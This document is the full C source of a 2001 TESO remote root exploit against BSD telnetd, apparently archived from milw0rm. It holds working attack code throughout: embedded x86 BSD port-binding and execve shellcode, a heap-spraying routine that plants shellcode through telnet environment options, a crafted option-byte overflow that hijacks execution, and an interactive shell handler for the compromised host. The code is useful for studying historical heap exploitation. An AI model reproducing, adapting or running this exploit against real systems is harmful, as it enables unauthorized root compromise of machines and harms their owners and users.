/* 7350854 - x86/bsd telnetd remote root exploit
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security. This includes especially the Bugtraq mailing list, the
 * www.hack.co.za website and any public exploit archive.
 *
 * (C) COPYRIGHT TESO Security, 2001
 * All Rights Reserved
 *
 *****************************************************************************
 * bug found by scut 2001/06/09
 * further research by smiler, zip, lorian and me.
 * thanks to zip's cool friend for giving me a testbed to play on
 *
 * tested against: BSDI BSD/OS 4.1
 *                 NetBSD 1.5
 *                 FreeBSD 3.1
 *                 FreeBSD 4.0-REL
 *                 FreeBSD 4.2-REL
 *                 FreeBSD 4.3-BETA
 *                 FreeBSD 4.3-STABLE
 *                 FreeBSD 4.3-RELEASE
 *
 */

#define VERSION "0.0.7"

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


/* global variables, uhhohh!
 */
int     mode = 16;
int     num = 245;
int     pop = 31500;    /* puts code at 0x08fdff0a */
int     bs = 1;         /* buffer start */

int     num34 = 244;
int     pop34 = 71833;  /* puts code at 0x0a0d08fe */
int     bs34 = 0;

int     walk;           /* populator walker */
int     force = 0;      /* force exploitation */
int     checkonly = 0;  /* check telnetd only */


void usage (char *progname);
int xp_check (int fd);
void xp_pop (int fd);
void xp_shrinkwin (int fd);
void xp_setenv (int fd, unsigned char *var, unsigned char *val);
void xp (int fd);
void shell (int sock);
void hexdump (char *desc, unsigned char *data, unsigned int amount);

/* imported from shellkit */
unsigned long int random_get (unsigned long int low, unsigned long int high);
void random_init (void);
int bad (unsigned char u);
int badstr (unsigned char *code, int code_len, unsigned char *bad,
        int bad_len);
unsigned long int x86_nop_rwreg (void);
unsigned long int x86_nop_xfer (char *xferstr);
unsigned int x86_nop (unsigned char *dest, unsigned int dest_len,
        unsigned char *bad, int bad_len);

#define BSET(dest, len, val, bw) { \
        dest &= ~(((unsigned char) ~0) >> bw);  /* clear lower bits */ \
        dest |= val << (8 - bw - len);          /* set value bits */ \
        bw += len; \
}

/* imported from network.c */
#define NET_CONNTIMEOUT 60
int     net_conntimeout = NET_CONNTIMEOUT;

unsigned long int net_resolve (char *host);
int net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, int sec);


/* x86/bsd PIC portshell shellcode
 * by lorian/teso
 * port 0x4444 (might want to change it here)
 */
unsigned char   x86_bsd_portshell[] =
        "\x31\xdb\xf7\xe3\x53\x43\x53\x43\x53\xb0\x61\x53"
        "\xcd\x80\x96\x52\x66\x68\x44\x44\x66\x53\x89\xe5"
                                /* ^^  ^^ port */
        "\x6a\x10\x55\x56\x56\x6a\x68\x58\xcd\x80\xb0\x6a"
        "\xcd\x80\x60\xb0\x1e\xcd\x80\x53\x50\x50\xb0\x5a"
        "\xcd\x80\x4b\x79\xf6\x52\x89\xe3\x68\x6e\x2f\x73"
        "\x68\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xb0\x3b\xcd"
        "\x80";

/* x86/bsd PIC execve shellcode
 * by lorian/teso
 */
unsigned char   x86_bsd_execvesh[] =
        "\x6a\x3b\x58\x99\x52\x89\xe3\x68\x6e\x2f\x73\x68"
        "\x68\x2f\x2f\x62\x69\x60\x5e\x5e\xcd\x80";

/* x86/bsd(i)+solaris execve shellcode
 * by lorian/teso
 */
unsigned char   x86_bsd_compaexec[] =
    "\xbf\xee\xee\xee\x08\xb8\xff\xf8\xff\x3c\xf7\xd0"
    "\xfd\xab\x31\xc0\x99\xb0\x9a\xab\xfc\xab\xb0\x3b"
    "\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
    "\xe3\x52\x53\x89\xe1\x52\x51\x53\xff\xd7";


unsigned char * shellcode = x86_bsd_compaexec;


#define COL 55


void
usage (char *progname)
{
        fprintf (stderr, "usage: %s [-n <num>] [-c] [-f] <ip>\n\n", progname);
        fprintf (stderr, "-n num\tnumber of populators, for testing purposes\n"
                "-c\tcheck exploitability only, do not exploit\n"
                "-f\tforce mode, override check results\n\n");
        fprintf (stderr, "WARNING: this is no easy exploit, we have to get things tightly aligned and\n"
                        "send 16/34mb of traffic to the remote telnet daemon. it might not be able to\n"
                        "take that, or it will take very long for it (> 1h). beware.\n\n");

        fprintf (stderr, "tested:\tFreeBSD 3.1, 4.0-REL, 4.2-REL, 4.3-BETA, 4.3-STABLE, 4.3-RELEASE \n"
                        "\tNetBSD 1.5\n"
                        "\tBSDI BSD/OS 4.1\n\n");

        exit (EXIT_FAILURE);
}

int
main (int argc, char *argv[])
{
        char                    c;
        char *                  progname;
        char *                  dest;
        int                     i, j, fd,
                                dots = 0;
        int                     popc;
        struct timeval          start,
                                cur;
        unsigned long long int  g_pct,  /* gaussian percentage */
                                g_all;  /* gaussian overall */


        fprintf (stderr, "7350854 - x86/bsd telnetd remote root\n"
                "by zip, lorian, smiler and scut.\n\n");

        progname = argv[0];
        if (argc < 2)
                usage (progname);


        while ((c = getopt (argc, argv, "n:cf")) != EOF) {
                switch (c) {
                case 'n':
                        num = atoi (optarg);
                        break;
                case 'c':
                        checkonly = 1;
                        break;
                case 'f':
                        force = 1;
                        break;
                default:
                        usage (progname);
                        break;
                }
        }

        dest = argv[argc - 1];
        if (dest[0] == '-')
                usage (progname);

        fd = net_connect (NULL, dest, 23, 20);
        if (fd <= 0) {
                fprintf (stderr, "failed to connect\n");
                exit (EXIT_FAILURE);
        }

        random_init ();

        if (xp_check (fd) == 0 && force == 0) {
                printf ("aborting\n");
#ifndef DEBUG
                exit (EXIT_FAILURE);
#endif
        }
        close (fd);

        if (checkonly)
                exit (EXIT_SUCCESS);

        fd = net_connect (NULL, dest, 23, 20);
        if (fd <= 0) {
                fprintf (stderr, "failed to connect the second time\n");
                exit (EXIT_FAILURE);
        }

        printf ("\n#############################################################################\n\n");
        printf ("ok baby, times are rough, we send %dmb traffic to the remote\n"
                "telnet daemon process, it will spill badly. but then, there is no\n"
                "other way, sorry...\n\n", mode);

#ifdef DEBUG
        getchar ();
#endif
        printf ("## setting populators to populate heap address space\n");

        g_all = ((unsigned long long int)(pop / 2)) *
                        ((unsigned long long int)(pop + 1));
        g_pct = 0;

        printf ("## number of setenvs (dots / network): %d\n", pop);
        printf ("## number of walks (percentage / cpu): %Lu\n", g_all);
        printf ("##\n");
        printf ("## the percentage is more realistic than the dots ;)\n");
        printf ("\n");
        printf ("percent |");

        popc = pop / COL;
        for (i = pop / popc ; i >= 0 ; --i)
                printf ("-");
        printf ("|      ETA |\n");

        gettimeofday (&start, NULL);

        for (walk = 0 ; walk < pop ; ++walk) {
                xp_pop (fd);

                g_pct += walk;

                if (walk % popc == 0)
                        dots += 1;

                if (walk % 200 == 0) {
                        int                     pct;
                        float                   pct_f;
                        unsigned long int       diff;

                        pct = (int) ((g_pct * 100) / g_all);
                        pct_f = g_pct * 100;
                        pct_f /= (float) g_all;

                        /* calculate difference not caring about accuracy */
                        gettimeofday (&cur, NULL);
                        diff = cur.tv_sec - start.tv_sec;

                        printf ((pct == 100) ? "\r%3.2f%% |" : ((pct / 10) ?
                                "\r %2.2f%% |" : "\r  %1.2f%% |"), pct_f);
                        for (j = 0 ; j < dots ; ++j)
                                printf (".");
                        for ( ; j <= COL ; ++j)
                                printf (" ");

                        if (pct != 0) {
                                diff = (int) ((((float)(100 - pct_f)) /
                                        (float) pct_f) * diff);
                                printf ("| %02lu:%02lu:%02lu |",
                                        diff / 3600, (diff % 3600) / 60,
                                        diff % 60);
                        } else {
                                printf ("| --:--:-- |");
                        }

                        fflush (stdout);
                }
        }
        printf ("\n\n");

        printf ("## sleeping for 10 seconds to let the process recover\n");
        sleep (10);

#ifdef DEBUG
        getchar ();
#endif
        /* return into 0x08feff0a */
        xp (fd);
        sleep (1);

        printf ("## ok, you should now have a root shell\n");
        printf ("## as always, after hard times, there is a reward...\n");
        printf ("\n\ncommand: ");
        fflush (stdout);

        shell (fd);

        exit (EXIT_SUCCESS);
}


void
xp (int fd)
{
        int             n;
        unsigned char   buf[2048];


        /* basic overflow */
        for (n = bs ; n < sizeof (buf) ; ++n)
                buf[n] = (n - bs) % 2 ? '\xf6' : '\xff';

        /* some nifty alignment */
        buf[0] = '\xff';        /* IAC */
        buf[1] = '\xf5';        /* AO  */

        if (mode == 16) {
                buf[2] = '\xff';        /* IAC */
                buf[3] = '\xfb';        /* WILL */
                buf[4] = '\x26';        /* ENCRYPTION */
        }

        /* force 0x08feff0a as return */
        buf[num++] = '\xff';
        buf[num++] = '\xfb';
        buf[num++] = '\x08';

        /* and the output_encrypt overwrite action, yay! */
        buf[num++] = '\xff';
        buf[num++] = '\xf6';

        /* XXX: should not fail here, though we should better loop and check */
        n = send (fd, buf, num, 0);
        if (n != num) {
                perror ("xp:send");
        }
}


#ifdef INSANE_MIND

void
xp_shrinkwin (int fd)
{
        int             n;
        int             iobc;
        int             p = 0;
        unsigned char   buf[2048];
        char            c;
        int             val;
        int             len;

        for (n = 0 ; n < sizeof (buf) ; ++n)
                buf[n] = n % 2 ? '\xf6' : '\xff';

        len = sizeof (val);
        getsockopt (fd, SOL_SOCKET, SO_SNDLOWAT, &val, &len);
        printf ("SO_SNDLOWAT = %d\n", val);
        val = 1;
        printf ("setsockopt: %s\n",
                setsockopt (fd, SOL_SOCKET, SO_SNDLOWAT, &val, sizeof(val)) ?
                "FAILED" : "SUCCESS");
        val = 1234;
        getsockopt (fd, SOL_SOCKET, SO_SNDLOWAT, &val, &len);
        printf ("SO_SNDLOWAT = %d\n", val);

        getchar();
        while (1) {
                if (p > 105)
                        c = getchar();
                if (c == 'r') {
                        getchar();
                        read (fd, &buf[1024], 384);
                } else if (c == 'o') {
                        getchar();
                        send (fd, "7", 1, MSG_OOB);
                } else if (c != 'r') {
                        usleep(100000);
                        n = send (fd, buf, 112, 0);
                        ioctl (fd, FIONREAD, &iobc);
                        len = sizeof (val);
                        getsockopt (fd, SOL_SOCKET, SO_RCVBUF, &val, &len);
                        printf ("%02d. send: %d  local: %d/%d (%d left)\n",
                                ++p, n, iobc, val, val - iobc);
                }
        }
}
#endif


/* xp_pop - populator function
 *
 * causes remote telnet daemon to setenv() variables with our content, populating
 * the heap with shellcode. this will get us more nopspace and place our shellcode
 * where the nice addresses are, that we can create by writing telnet option
 * strings.
 *
 * XXX: there seems to be a maximum size for the environment value you can set,
 *      which is 510. we use 496 bytes for nopspace and shellcode therefore.
 *      should work, rather similar to tsig tcp/malloc exploitation. -sc
 */

void
xp_pop (int fd)
{
        unsigned char   var[16];
        unsigned char   storebuf[496];
        sprintf (var, "%06x", walk);
#ifdef DEBUG
        memset (storebuf, '\xcc', sizeof (storebuf));
#else
/*      memset (storebuf, '\x90', sizeof (storebuf));   */
        x86_nop (storebuf, sizeof (storebuf), "\x00\x01\x02\x03\xff", 5);
        memcpy (storebuf + sizeof (storebuf) - strlen (shellcode) - 1,
                shellcode, strlen (shellcode));
#endif
        storebuf[sizeof (storebuf) - 1] = '\0';

        xp_setenv (fd, var, storebuf);
}


void
xp_setenv (int fd, unsigned char *var, unsigned char *val)
{
        int             n = 0;
        unsigned char   buf[2048];

        buf[n++] = IAC;
        buf[n++] = SB;
        buf[n++] = TELOPT_NEW_ENVIRON;
        buf[n++] = TELQUAL_IS;
        buf[n++] = ENV_USERVAR;

        /* should not contain < 0x04 */
        while (*var) {
                if (*var == IAC)
                        buf[n++] = *var;
                buf[n++] = *var++;
        }
        buf[n++] = NEW_ENV_VALUE;
        while (*val) {
                if (*val == IAC)
                        buf[n++] = *val;
                buf[n++] = *val++;
        }
        buf[n++] = IAC;
        buf[n++] = SE;

        if (send (fd, buf, n, 0) != n) {
                perror ("xp_setenv:send");
                exit (EXIT_FAILURE);
        }
}


int
xp_check (int fd)
{
        int             n;
        unsigned int    expect_len = 15;
        unsigned char   expected[] =
                "\x0d\x0a\x5b\x59\x65\x73\x5d\x0d\x0a\xff\xfe\x08\xff\xfd\x26";
                /* \r  \n  [   Y   e   s   ]   \r  \n IAC DONT 08 IAC DO 26*/
        unsigned int    additional_len = 8;
        unsigned char   additional[] =
                "\xff\xfa\x26\x01\x01\x02\xff\xf0";
                /*IAC SB  ENC ........... IAC SE */

        unsigned char   buf[128];

        read (fd, buf, sizeof (buf));

        n = 0;
        buf[n++] = IAC;                 /* 0xff */
        buf[n++] = AYT;                 /* 0xf6 */

        buf[n++] = IAC;                 /* 0xff */
        buf[n++] = WILL;                /* 0xfb */
        buf[n++] = TELOPT_NAOL;         /* 0x08 */

        buf[n++] = IAC;                 /* 0xff */
        buf[n++] = WILL;                /* 0xfb */
        buf[n++] = TELOPT_ENCRYPT;      /* 0x26 */

#ifdef DEBUG
        hexdump ("check send buffer", buf, n);
#endif
        if (send (fd, buf, n, 0) != n) {
                perror ("xp_check:send");
                exit (EXIT_FAILURE);
        }

        n = read (fd, buf, sizeof (buf));
#ifdef DEBUG
        hexdump ("check recv buffer", buf, n);
#endif

        if (memcmp (buf, expected, expect_len) == 0) {
                if (memcmp (buf+expect_len, additional, additional_len) == 0) {
                        mode = 16;
                } else {
                        mode = 34;
                        bs = bs34;
                }
                printf ("check: PASSED, using %dmb mode\n", mode);

                return (1);
        }

        printf ("check: FAILED\n");

        return (0);
}


void
shell (int sock)
{
        int     l;
        char    buf[512];
        fd_set  rfds;


        while (1) {
                FD_SET (0, &rfds);
                FD_SET (sock, &rfds);

                select (sock + 1, &rfds, NULL, NULL, NULL);
                if (FD_ISSET (0, &rfds)) {
                        l = read (0, buf, sizeof (buf));
                        if (l <= 0) {
                                perror ("read user");
                                exit (EXIT_FAILURE);
                        }
                        write (sock, buf, l);
                }

                if (FD_ISSET (sock, &rfds)) {
                        l = read (sock, buf, sizeof (buf));
                        if (l <= 0) {
                                perror ("read remote");
                                exit (EXIT_FAILURE);
                        }
                        write (1, buf, l);
                }
        }
}


/* ripped from zodiac */
void
hexdump (char *desc, unsigned char *data, unsigned int amount)
{
        unsigned int    dp, p;  /* data pointer */
        const char      trans[] =
                "................................ !\"#$%&'()*+,-./0123456789"
                ":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
                "nopqrstuvwxyz{|}~...................................."
                "....................................................."
                "........................................";


        printf ("/* %s, %u bytes */\n", desc, amount);

        for (dp = 1; dp <= amount; dp++) {
                fprintf (stderr, "%02x ", data[dp-1]);
                if ((dp % 8) == 0)
                        fprintf (stderr, " ");
                if ((dp % 16) == 0) {
                        fprintf (stderr, "| ");
                        p = dp;
                        for (dp -= 16; dp < p; dp++)
                                fprintf (stderr, "%c", trans[data[dp]]);
                        fflush (stderr);
                        fprintf (stderr, "\n");
                }
                fflush (stderr);
        }
        if ((amount % 16) != 0) {
                p = dp = 16 - (amount % 16);
                for (dp = p; dp > 0; dp--) {
                        fprintf (stderr, "   ");
                        if (((dp % 8) == 0) && (p != 8))
                                fprintf (stderr, " ");
                        fflush (stderr);
                }
                fprintf (stderr, " | ");
                for (dp = (amount - (16 - p)); dp < amount; dp++)
                        fprintf (stderr, "%c", trans[data[dp]]);
                fflush (stderr);
        }
        fprintf (stderr, "\n");

        return;
}



unsigned long int
net_resolve (char *host)
{
        long            i;
        struct hostent  *he;

        i = inet_addr(host);
        if (i == -1) {
                he = gethostbyname(host);
                if (he == NULL) {
                        return (0);
                } else {
                        return (*(unsigned long *) he->h_addr);
                }
        }
        return (i);
}


int
net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, int sec)
{
        int                     n,
                                len,
                                error,
                                flags;
        int                     fd;
        struct timeval          tv;
        fd_set                  rset, wset;
        struct sockaddr_in      csa;

        if (cs == NULL)
                cs = &csa;

        /* first allocate a socket */
        cs->sin_family = AF_INET;
        cs->sin_port = htons (port);
        fd = socket (cs->sin_family, SOCK_STREAM, 0);
        if (fd == -1)
                return (-1);

        if (!(cs->sin_addr.s_addr = net_resolve (server))) {
                close (fd);
                return (-1);
        }

        flags = fcntl (fd, F_GETFL, 0);
        if (flags == -1) {
                close (fd);
                return (-1);
        }
        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
        if (n == -1) {
                close (fd);
                return (-1);
        }

        error = 0;

        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
        if (n < 0) {
                if (errno != EINPROGRESS) {
                        close (fd);
                        return (-1);
                }
        }
        if (n == 0)
                goto done;

        FD_ZERO(&rset);
        FD_ZERO(&wset);
        FD_SET(fd, &rset);
        FD_SET(fd, &wset);
        tv.tv_sec = sec;
        tv.tv_usec = 0;

        n = select(fd + 1, &rset, &wset, NULL, &tv);
        if (n == 0) {
                close(fd);
                errno = ETIMEDOUT;
                return (-1);
        }
        if (n == -1)
                return (-1);

        if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
                if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
                        len = sizeof(error);
                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
                                errno = ETIMEDOUT;
                                return (-1);
                        }
                        if (error == 0) {
                                goto done;
                        } else {
                                errno = error;
                                return (-1);
                        }
                }
        } else
                return (-1);

done:
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
                return (-1);
        return (fd);
}


/* imported from shellkit */

unsigned long int
random_get (unsigned long int low, unsigned long int high)
{
        unsigned long int       val;

        if (low > high) {
                low ^= high;
                high ^= low;
                low ^= high;
        }

        val = (unsigned long int) random ();
        val %= (high - low);
        val += low;

        return (val);
}


void
random_init (void)
{
        srandom (time (NULL));
}


int
bad (unsigned char u)
{
        if (u == '\x00' || u == '\x0a' || u == '\x0d' || u == '\x25')
                return (1);

        return (0);
}

int
badstr (unsigned char *code, int code_len, unsigned char *bad, int bad_len)
{
        int     n;

        for (code_len -= 1 ; code_len >= 0 ; --code_len) {
                for (n = 0 ; n < bad_len ; ++n)
                        if (code[code_len] == bad[n])
                                return (1);
        }

        return (0);
}

unsigned long int
x86_nop_rwreg (void)
{
        unsigned long int       reg;

        do {
                reg = random_get (0, 7);
        } while (reg == 4);     /* 4 = $esp */

        return (reg);
}



unsigned long int
x86_nop_xfer (char *xferstr)
{
        int                     bw = 0; /* bitfield walker */
        unsigned char           tgt;    /* resulting instruction */

        /* in a valid xferstr we trust */
        for (tgt = 0 ; xferstr != NULL && xferstr[0] != '\0' ; ++xferstr) {
                switch (xferstr[0]) {
                case ('0'):
                        BSET (tgt, 1, 0, bw);
                        break;
                case ('1'):
                        BSET (tgt, 1, 1, bw);
                        break;
                case ('r'):
                        BSET (tgt, 3, x86_nop_rwreg (), bw);
                        break;
                case ('.'):
                        break;  /* ignore */
                default:
                        fprintf (stderr, "on steroids, huh?\n");
                        exit (EXIT_FAILURE);
                        break;
                }
        }

        if (bw != 8) {
                fprintf (stderr, "invalid bitwalker: bw = %d\n", bw);
                exit (EXIT_FAILURE);
        }

        return (tgt);
}


unsigned int
x86_nop (unsigned char *dest, unsigned int dest_len,
        unsigned char *bad, int bad_len)
{
        int     walk;
        int     bcount; /* bad counter */
        char *  xs;
        char *  xferstr[] = {
                "0011.0111",    /* aaa */
                "0011.1111",    /* aas */
                "1001.1000",    /* cbw */
                "1001.1001",    /* cdq */
                "1111.1000",    /* clc */
                "1111.1100",    /* cld */
                "1111.0101",    /* cmc */
                "0010.0111",    /* daa */
                "0010.1111",    /* das */
                "0100.1r",      /* dec <reg> */
                "0100.0r",      /* inc <reg> */
                "1001.1111",    /* lahf */
                "1001.0000",    /* nop */
                "1111.1001",    /* stc */
                "1111.1101",    /* std */
                "1001.0r",      /* xchg al, <reg> */
                NULL,
        };
        unsigned char   tgt;


        for (walk = 0 ; dest_len > 0 ; dest_len -= 1 , walk += 1) {
                /* avoid endless loops on excessive badlisting */
                for (bcount = 0 ; bcount < 16384 ; ++bcount) {
                        xs = xferstr[random_get (0, 15)];
                        tgt = x86_nop_xfer (xs);

                        dest[walk] = tgt;
                        if (badstr (&dest[walk], 1, bad, bad_len) == 0)
                                break;
                }

                /* should not happen */
                if (bcount >= 16384) {
                        fprintf (stderr, "too much blacklisting, giving up...\n");
                        exit (EXIT_FAILURE);
                }
        }

        return (walk);
}

// milw0rm.com [2001-06-09]
